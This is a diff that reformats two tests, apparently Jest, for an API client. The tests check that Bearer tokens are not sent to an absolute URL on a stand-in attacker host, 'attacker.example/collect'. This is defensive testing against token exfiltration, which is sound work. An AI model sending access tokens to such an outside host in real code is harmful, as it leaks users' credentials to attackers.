@@ -34,10 +34,12 @@ it('keeps Bearer tokens on the configured API origin for absolute request paths'
 
   await client.get('https://attacker.example/collect')
 
-  expect(observedRequests).toEqual([{
-    authorization: 'Bearer access-token',
-    url: 'https://api.example.test/https://attacker.example/collect',
-  }])
+  expect(observedRequests).toEqual([
+    {
+      authorization: 'Bearer access-token',
+      url: 'https://api.example.test/https://attacker.example/collect',
+    },
+  ])
 })
 
 it('rejects absolute requests before acquiring a token when the API base URL is blank', async () => {
@@ -46,9 +48,9 @@ it('rejects absolute requests before acquiring a token when the API base URL is 
   axios.defaults.adapter = adapter
   const client = createApiClient(getAccessTokenSilently, '')
 
-  await expect(client.get(
-    'https://attacker.example/collect',
-  )).rejects.toThrow('API base URL is not configured')
+  await expect(client.get('https://attacker.example/collect')).rejects.toThrow(
+    'API base URL is not configured',
+  )
 
   expect(getAccessTokenSilently).not.toHaveBeenCalled()
   expect(adapter).not.toHaveBeenCalled()
